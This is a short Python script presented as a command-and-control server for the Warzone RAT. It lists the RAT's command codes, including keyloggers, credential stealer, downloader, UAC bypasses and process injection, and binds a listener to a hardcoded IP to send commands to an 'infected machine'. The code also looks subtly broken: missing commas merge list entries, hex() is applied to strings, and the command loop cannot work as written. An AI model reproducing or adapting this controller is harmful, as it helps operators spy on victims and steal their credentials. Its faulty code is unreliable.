#!/usr/bin/env python3
#C&C server script for Warzone RAT malware
from socket import *
from art import *
import random
import string

commands = ["Keylogger 1", "Process Enumeration", "Drive Informtion",
            "File Enumeration", "Get File Name ??", "Unclear", "Unclear"
            "Unclear", "Unclear", "Remote Webcam", "Remote Webcam 2",
            "Unclear", "Unclear", "ICMP Hole Punching", "Create and Write"
            "Event Handler", "Credential Stealer", "Downloader", "Keylogger 2"
            "Keylogger 3", "Unclear", "Unclear", "Terminate Connection", 
            "Unclear", "Unclear", "Unclear", "Execute File", "Unclear"
            "Not Win10 UAC Bypass", "Win10 UAC Bypass", "Injection", "Unclear"]

def intro():
    tprint('WarzoneCC')
    print('by msaltini \n')

def choices():
    size = input('How many commands do you want to send to the RAT?')
    return size

def list():
    print("Following are the possible commands that you can run:")
    for i in range(len(commands)):
        print(hex(i * 2), commands[i])

def communicate():
    bufferSize = choices()
    serverPort = 6703
    randomLetter = random.choice(string.ascii_letters)

    cc = socket(AF_INET,SOCK_STREAM)
    cc.bind(('195.140.214.82', serverPort))
    cc.listen(1)

    (connectionSocket, addr) = cc.accept()
    print("Established connection from infected machine: ", addr)
    message = "\xe4\x66\xbb\x29"
    message += hex(bufferSize + "\x00\x00\x00")
    message += hex(randomLetter) * 4
    connectionSocket.send(message)

    for i in bufferSize:
        command = list()
        connectionSocket.recv(1024)
        connectionSocket.send(hex(command))
        ++i

def main():
    intro()
    list()
    communicate()

if __name__ == "__main__":
    main()